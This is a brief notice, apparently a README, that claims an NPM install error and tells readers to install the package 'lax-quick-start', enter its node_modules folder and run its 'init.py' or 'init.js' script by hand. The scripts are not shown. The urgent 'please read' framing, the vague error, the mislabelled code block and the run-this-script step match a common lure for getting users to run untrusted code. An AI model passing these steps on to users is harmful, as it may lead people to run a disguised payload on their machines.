**Issue with NPM Package Please Read**

#### Please refer to manual download, found an error in which NPM just stops working after accepting a package download. **Please read below**

Follow this guide from your terminal and type the following commands:
``` python
mkdir temp && cd temp
npm i lax-quick-start
cd node_modules/lax-quick-start
python3 init.py
# or (both do same thing)
node init.js
```
Or read how to install the python script from my github repository below
